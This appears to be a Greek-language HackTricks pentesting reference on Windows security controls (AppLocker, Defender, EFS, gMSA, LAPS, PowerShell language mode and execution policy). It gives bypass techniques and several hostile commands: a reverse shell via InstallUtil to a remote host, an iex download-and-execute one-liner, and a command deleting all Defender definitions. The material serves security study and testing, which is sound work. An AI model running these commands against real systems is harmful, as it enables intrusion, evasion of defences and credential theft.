# Έλεγχοι ασφαλείας των Windows

{{#include ../banners/hacktricks-training.md}}

## Πολιτική AppLocker

Η λίστα επιτρεπόμενων εφαρμογών είναι ένας κατάλογος εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων αρχείων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Στόχος είναι η προστασία του περιβάλλοντος από επιβλαβές malware και μη εγκεκριμένο λογισμικό που δεν ανταποκρίνεται στις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση της Microsoft για τη δημιουργία λίστας επιτρεπόμενων εφαρμογών** και παρέχει στους διαχειριστές συστημάτων έλεγχο σχετικά με **τις εφαρμογές και τα αρχεία που μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** των εκτελέσιμων αρχείων, των scripts, των αρχείων εγκατάστασης των Windows, των DLL, των packaged apps και των προγραμμάτων εγκατάστασης packaged apps.\
Είναι συνηθισμένο οι οργανισμοί να **μπλοκάρουν τα cmd.exe και PowerShell.exe** και την εγγραφή σε ορισμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις βρίσκονται στη μαύρη/λευκή λίστα:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Το `Test-AppLockerPolicy` αξιολογεί υποψήφια αρχεία για μια συγκεκριμένη ταυτότητα βάσει μιας πολιτικής AppLocker. Ελέγξτε τον λογαριασμό του οποίου το token θα εκτελέσει το payload, επειδή οι κανόνες μπορεί να στοχεύουν χρήστες ή ομάδες· το `Get-AppLockerFileInformation` είναι επίσης χρήσιμο για την εξέταση της διαδρομής, του hash και των μεταδεδομένων του publisher, στα οποία μπορεί να αντιστοιχούν κανόνες.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Πριν θεωρήσετε ότι ένα αποτέλεσμα δοκιμής με ένδειξη denied σημαίνει πως επιβλήθηκε αποκλεισμός, ελέγξτε την **ενεργή λειτουργία επιβολής της συγκεκριμένης συλλογής κανόνων** και την υπηρεσία Application Identity. Η λειτουργία `AuditOnly` αξιολογεί τους κανόνες, αλλά εξακολουθεί να επιτρέπει την εκτέλεση, ενώ η λειτουργία `NotConfigured` δεν ισοδυναμεί με απενεργοποίηση όταν η συλλογή περιέχει κανόνες.<sup>[[7]](#references)</sup> Αν η υπηρεσία `AppIDSvc` έχει σταματήσει, δεν επιβάλλονται οι κανόνες του AppLocker.<sup>[[9]](#references)</sup> Αυτοί οι έλεγχοι ξεχωρίζουν μια πραγματική παράκαμψη από μια πολιτική που δεν απέκλεισε ποτέ το αρχείο.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Για μια δοκιμή ελεγχόμενης εκτέλεσης, συγκρίνετε το αρχείο καταγραφής συμβάντων του AppLocker: τα **8003/8006** σημαίνουν ότι το EXE/DLL ή το script/MSI θα είχε αποκλειστεί σε λειτουργία ελέγχου· τα **8004/8007** σημαίνουν ότι αποκλείστηκε πράγματι. Δοκιμάστε τον ίδιο τύπο αρχείου και την ίδια ταυτότητα με την προβλεπόμενη διαδρομή εκτέλεσης.<sup>[[8]](#references)</sup>

Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζει το AppLocker, παρέχοντας έναν τρόπο να εξετάσετε το τρέχον σύνολο κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμοι **εγγράψιμοι φάκελοι** για παράκαμψη της πολιτικής AppLocker: Αν το AppLocker επιτρέπει την εκτέλεση οποιουδήποτε αρχείου μέσα στο `C:\Windows\System32` ή στο `C:\Windows`, υπάρχουν **εγγράψιμοι φάκελοι** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτόν τον περιορισμό**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Τα binaries [**"LOLBAS's"**](https://lolbas-project.github.io/) που θεωρούνται συνήθως **trusted** μπορούν επίσης να είναι χρήσιμα για την παράκαμψη του AppLocker.
- **Οι κακογραμμένοι κανόνες μπορούν επίσης να παρακαμφθούν**
  - Για παράδειγμα, με το **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτρέπεται.
  - Οι οργανισμοί συχνά επικεντρώνονται επίσης στο **μπλοκάρισμα του εκτελέσιμου αρχείου `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τις **άλλες** [**θέσεις εκτελέσιμων αρχείων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
- **Η επιβολή κανόνων για DLL ενεργοποιείται πολύ σπάνια**, λόγω του επιπλέον φόρτου που μπορεί να επιφέρει σε ένα σύστημα και των δοκιμών που απαιτούνται για να διασφαλιστεί ότι δεν θα προκληθούν προβλήματα. Επομένως, η χρήση **DLL ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε** κώδικα **Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Αποθήκευση διαπιστευτηρίων

### Security Accounts Manager (SAM)

Τα τοπικά διαπιστευτήρια βρίσκονται σε αυτό το αρχείο· οι κωδικοί πρόσβασης είναι hashed.

### Local Security Authority (LSA) - LSASS

Τα **διαπιστευτήρια** (hashed) **αποθηκεύονται** στη **μνήμη** αυτού του υποσυστήματος για λόγους Single Sign-On.\
Η **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικών πρόσβασης, δικαιώματα χρηστών...), την **authentication**, τα **access tokens**...\
Η LSA είναι αυτή που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια στο αρχείο **SAM** (για τοπική σύνδεση) και θα **επικοινωνήσει** με τον **domain controller** για να κάνει authentication έναν χρήστη domain.

Τα **διαπιστευτήρια** **αποθηκεύονται** στη **διεργασία LSASS**: Kerberos tickets, hashes NT και LM, εύκολα αποκρυπτογραφήσιμοι κωδικοί πρόσβασης.

### LSA secrets

Η LSA μπορεί να αποθηκεύσει ορισμένα διαπιστευτήρια στον δίσκο:

- Κωδικός πρόσβασης του λογαριασμού υπολογιστή του Active Directory (μη προσβάσιμος domain controller).
- Κωδικοί πρόσβασης λογαριασμών υπηρεσιών Windows
- Κωδικοί πρόσβασης προγραμματισμένων εργασιών
- Άλλα (κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Υπάρχει μόνο στους Domain Controllers.

## Defender

Το [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που διατίθεται στα Windows 10 και Windows 11, καθώς και σε εκδόσεις του Windows Server. **Μπλοκάρει** συνήθη εργαλεία pentesting όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι να **παρακαμφθούν αυτές οι προστασίες**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender**, μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να δείτε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να κάνετε enumeration, μπορείτε επίσης να εκτελέσετε:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Κρυπτογραφημένο σύστημα αρχείων (EFS)

Το EFS προστατεύει αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** που είναι γνωστό ως **Κλειδί Κρυπτογράφησης Αρχείου (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται στα μεταδεδομένα NTFS `$EFS` του αρχείου (`$LOGGED_UTILITY_STREAM`), **όχι** σε μια συνηθισμένη εναλλακτική ροή δεδομένων `$DATA`.<sup>[[10]](#references)</sup> Όταν απαιτείται αποκρυπτογράφηση, το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη ξετυλίγει το FEK. Ένας ρυθμισμένος παράγοντας ανάκτησης δεδομένων (DRA) έχει ένα ξεχωριστό κρυπτογραφημένο αντίγραφο του FEK στο πεδίο ανάκτησης δεδομένων.<sup>[[13]](#references)</sup>

**Σενάρια αποκρυπτογράφησης χωρίς ενέργεια του χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε σύστημα αρχείων που δεν υποστηρίζει EFS, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Τα κρυπτογραφημένα αρχεία που αποστέλλονται μέσω δικτύου με το πρωτόκολλο SMB/CIFS αποκρυπτογραφούνται πριν από τη μετάδοση.

Αυτή η μέθοδος κρυπτογράφησης επιτρέπει **διαφανή πρόσβαση** του κατόχου στα κρυπτογραφημένα αρχεία. Ωστόσο, η απλή αλλαγή του κωδικού πρόσβασης του κατόχου και η σύνδεση δεν επιτρέπουν την αποκρυπτογράφηση.

**Βασικά σημεία**:

- Το EFS χρησιμοποιεί ένα συμμετρικό FEK, κρυπτογραφημένο με το δημόσιο κλειδί του χρήστη.
- Η αποκρυπτογράφηση χρησιμοποιεί το ιδιωτικό κλειδί του χρήστη για την πρόσβαση στο FEK.
- Η αυτόματη αποκρυπτογράφηση γίνεται υπό συγκεκριμένες συνθήκες, όπως κατά την αντιγραφή σε FAT32 ή τη μετάδοση μέσω δικτύου.
- Ο κάτοχος έχει πρόσβαση στα κρυπτογραφημένα αρχεία χωρίς πρόσθετα βήματα.

### Έλεγχος πληροφοριών EFS

Μην συμπεραίνετε ότι χρησιμοποιείται EFS από το `%APPDATA%\Microsoft\Protect`: εκεί αποθηκεύονται κύρια κλειδιά DPAPI για πολλές λειτουργίες των Windows.<sup>[[19]](#references)</sup> Αντίθετα, ελέγξτε ένα κρυπτογραφημένο αρχείο με την εντολή `cipher /c "C:\path\file"` για να δείτε τα πιστοποιητικά χρήστη και ανάκτησης. Οι εντολές `cipher /e` και `cipher /d` κρυπτογραφούν και αποκρυπτογραφούν αρχεία για μια αρχή ασφαλείας που διαθέτει το αντίστοιχο ιδιωτικό κλειδί.<sup>[[11]](#references)</sup>

### Αποκρυπτογράφηση αρχείων EFS

Αν η εντολή `cipher /c` εμφανίζει ένα πιστοποιητικό ανάκτησης και έχετε το **αντίστοιχο ιδιωτικό κλειδί DRA** σε αρχείο PFX, εισαγάγετε αυτό το PFX στο χώρο αποθήκευσης πιστοποιητικών του τρέχοντος χρήστη και, στη συνέχεια, αποκρυπτογραφήστε το αρχείο.<sup>[[11]](#references)[[12]](#references)</sup> Ένα νεοδημιουργημένο πιστοποιητικό DRA δεν μπορεί να αποκρυπτογραφήσει παλαιότερα αρχεία: το δημόσιο κλειδί του πρέπει να είχε συμπεριληφθεί ήδη κατά την κρυπτογράφηση του αρχείου. Η πρόσβαση μέσω NTFS ACL ή η επαναφορά του κωδικού πρόσβασης του λογαριασμού από μόνη της δεν παρέχει το απαιτούμενο ιδιωτικό κλειδί.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Έχοντας δικαιώματα SYSTEM

Αυτή η προσέγγιση απαιτεί ο **χρήστης-θύμα** να **εκτελεί** μια **διεργασία** στον host. Αν ισχύει αυτό, από μια συνεδρία `meterpreter` μπορείτε να μιμηθείτε το token της διεργασίας του χρήστη (`impersonate_token` από το `incognito`). Εναλλακτικά, μπορείτε να κάνετε `migrate` στη διεργασία του χρήστη.

#### Γνωρίζοντας τον κωδικό πρόσβασης του χρήστη

Το Mimikatz μπορεί να εισαγάγει το πιστοποιητικό και το ιδιωτικό κλειδί του χρήστη και, στη συνέχεια, να τα χρησιμοποιήσει για να αποκρυπτογραφήσει αρχεία που προστατεύονται από EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Managed Service Accounts ομάδας (gMSA)

Η Microsoft ανέπτυξε τα **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσιών στις υποδομές IT. Σε αντίθεση με τους παραδοσιακούς λογαριασμούς υπηρεσιών, στους οποίους συχνά είναι ενεργοποιημένη η ρύθμιση "**Ο κωδικός πρόσβασης δεν λήγει ποτέ**", τα gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Αυτόματη διαχείριση κωδικών πρόσβασης**: Τα gMSA χρησιμοποιούν έναν σύνθετο κωδικό πρόσβασης 240 byte, ο οποίος συνήθως αλλάζει κάθε 30 ημέρες. Οι ελεγκτές τομέα τον παράγουν χρησιμοποιώντας υλικό κλειδιού KDS, εξαλείφοντας την ανάγκη για μη αυτόματες ενημερώσεις κωδικών πρόσβασης.<sup>[[16]](#references)[[20]](#references)</sup>
- **Ενισχυμένη ασφάλεια**: Αυτοί οι λογαριασμοί δεν επηρεάζονται από κλειδώματα και δεν μπορούν να χρησιμοποιηθούν για διαδραστικές συνδέσεις, ενισχύοντας την ασφάλειά τους.
- **Υποστήριξη πολλών host**: Τα gMSA μπορούν να χρησιμοποιούνται από πολλούς host, κάτι που τα καθιστά ιδανικά για υπηρεσίες που εκτελούνται σε πολλούς server.
- **Δυνατότητα προγραμματισμένων εργασιών**: Σε αντίθεση με τους managed service accounts, τα gMSA υποστηρίζουν την εκτέλεση προγραμματισμένων εργασιών.
- **Απλοποιημένη διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Service Principal Name (SPN) όταν αλλάζουν τα στοιχεία sAMaccount ή το όνομα DNS του υπολογιστή, απλοποιώντας τη διαχείριση SPN.

Ένας ελεγκτής τομέα κατασκευάζει το χαρακτηριστικό LDAP _**msDS-ManagedPassword**_ κατά την ανάγνωσή του, χρησιμοποιώντας υλικό κωδικού πρόσβασης που παράγεται από το KDS· η τιμή δεν είναι ένας κωδικός πρόσβασης αποθηκευμένος ανεξάρτητα. Συνήθως αλλάζει κάθε 30 ημέρες.<sup>[[20]](#references)</sup> Το επιστρεφόμενο [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) **δεν είναι κρυπτογραφημένος κωδικός πρόσβασης**: το πεδίο `CurrentPassword` περιέχει τον κωδικό πρόσβασης σε απλό κείμενο.<sup>[[14]](#references)</sup> Η πρόσβαση ελέγχεται μέσω του `msDS-GroupMSAMembership`, επομένως κάθε principal με δικαιώματα ανάκτησης βρίσκεται εντός του πεδίου εφαρμογής, όχι μόνο οι διαχειριστές ή οι host υπηρεσιών.<sup>[[15]](#references)</sup> Η σύνδεση LDAP πρέπει να παρέχει εμπιστευτικότητα, για παράδειγμα μέσω LDAPS ή SASL sealing.<sup>[[20]](#references)</sup>

Για παράγωγο κωδικού πρόσβασης offline μετά την έκθεση του κλειδιού root KDS, δείτε το [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Μπορείτε να διαβάσετε αυτόν τον κωδικό πρόσβασης με το [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Επίσης, δείτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **NTLM relay attack** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Κατά την enumeration, διακρίνετε το **legacy Microsoft LAPS** από την εγγενή υλοποίηση **Windows LAPS**. Το Windows LAPS κυκλοφόρησε στις ενημερώσεις των Windows της 11ης Απριλίου 2023 και μπορεί να δημιουργεί αντίγραφα ασφαλείας ενός διαχειριζόμενου κωδικού πρόσβασης τοπικού διαχειριστή στο **Windows Server Active Directory** ή στο **Microsoft Entra ID**. Σε υλοποιήσεις που βασίζονται σε AD, μπορεί επιπλέον να κρυπτογραφεί κωδικούς πρόσβασης, να διατηρεί ιστορικό κρυπτογραφημένων κωδικών πρόσβασης και να διαχειρίζεται τον κωδικό πρόσβασης DSRM ενός domain controller. Το legacy MSI που μπορούσε να ληφθεί έχει καταργηθεί σε νεότερες εκδόσεις των Windows, αν και το Windows LAPS μπορεί να λειτουργήσει σε λειτουργία legacy emulation.<sup>[[6]](#references)</sup>

Επειδή το legacy Microsoft LAPS και το Windows LAPS είναι ξεχωριστές υλοποιήσεις, προσδιορίστε ποια είναι εγκατεστημένη προτού εφαρμόσετε επιθέσεις που αφορούν συγκεκριμένα attributes ή cmdlets. Η συνδεδεμένη σελίδα καλύπτει την ανακάλυψη, την enumeration των ACL, την ανάκτηση, τη χειραγώγηση της λήξης και την offline ανάκτηση, χωρίς να επαναλαμβάνει εδώ αυτές τις διαδικασίες.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως ο αποκλεισμός αντικειμένων COM, η χρήση μόνο εγκεκριμένων τύπων .NET, οι ροές εργασιών που βασίζονται σε XAML, οι κλάσεις PowerShell και άλλα.

### **Έλεγχος**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

Το `powershell.exe -Version 2` αποτελούσε παλαιότερη υποβάθμιση μόνο σε συστήματα στα οποία ήταν εγκατεστημένη η προαιρετική μηχανή PowerShell 2. Δεν περιλαμβάνεται πλέον στα ενημερωμένα Windows 11 24H2 ή Windows Server 2025· μην το θεωρείτε τρέχον CLM bypass.<sup>[[17]](#references)</sup> Όταν εφαρμόζεται έλεγχος εφαρμογών, το PowerShell εκτελεί μη έμπιστο κώδικα σε Constrained Language, ενώ τα scripts που είναι έμπιστα βάσει πολιτικής μπορούν να εκτελεστούν σε Full Language.<sup>[[18]](#references)</sup>

Για παλαιότερες διαμορφώσεις, μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωττίσετε, ίσως χρειαστεί** **να** _**προσθέσετε μια αναφορά**_ -> _Περιήγηση_ ->_Περιήγηση_ -> προσθέστε το `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **αλλάξτε το project σε .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε** κώδικα Powershell σε οποιαδήποτε διεργασία και να παρακάμψετε την περιορισμένη λειτουργία. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Πολιτική εκτέλεσης PS

Από προεπιλογή, έχει οριστεί σε **restricted.** Οι κύριοι τρόποι παράκαμψης αυτής της πολιτικής:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Περισσότερα μπορείτε να βρείτε [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Διεπαφή Security Support Provider (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για τον έλεγχο ταυτότητας χρηστών.

Το SSPI αναλαμβάνει να βρει το κατάλληλο πρωτόκολλο για δύο μηχανήματα που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος είναι το Kerberos. Στη συνέχεια, το SSPI διαπραγματεύεται ποιο πρωτόκολλο ελέγχου ταυτότητας θα χρησιμοποιηθεί. Αυτά τα πρωτόκολλα ελέγχου ταυτότητας ονομάζονται Security Support Provider (SSP), βρίσκονται σε κάθε μηχάνημα Windows με τη μορφή DLL και τα δύο μηχανήματα πρέπει να υποστηρίζουν το ίδιο πρωτόκολλο για να μπορούν να επικοινωνήσουν.

### Κύρια SSPs

- **Kerberos**: Το προτιμώμενο
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Για λόγους συμβατότητας
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Για web servers και LDAP, με τον κωδικό πρόσβασης σε μορφή hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: Για SSL και TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του πρωτοκόλλου που θα χρησιμοποιηθεί (Kerberos ή NTLM, με προεπιλεγμένο το Kerberos)
  - %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.

## UAC - Έλεγχος λογαριασμού χρήστη

Ο [Έλεγχος λογαριασμού χρήστη (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί **ένα μήνυμα επιβεβαίωσης για δραστηριότητες με αυξημένα δικαιώματα**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Παράκαμψη του AppLocker και της περιορισμένης λειτουργίας γλώσσας του PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [πώς να αποκρυπτογραφήσετε αρχεία EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying για gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 τρόποι παράκαμψης της πολιτικής εκτέλεσης του PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Χρήση των cmdlets του AppLocker για Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Επισκόπηση του Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Εργασία με κανόνες AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Χρήση της Προβολής συμβάντων με το AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Διεργασίες και αλληλεπιδράσεις του AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Ροές αρχείων (τοπικά συστήματα αρχείων)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Εντολή Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Εντολή Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Δημιουργία αντιγράφου ασφαλείας του ιδιωτικού κλειδιού EFS του agent ανάκτησης](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Ιδιότητα ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Ασφάλιση λογαριασμών υπηρεσίας διαχειριζόμενων από ομάδα](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Δυνατότητες που καταργήθηκαν από το Windows client](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Χρήση του App Control για την ασφάλιση του PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Συμβάν 4693 και κύρια κλειδιά DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Κατασκευή του msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
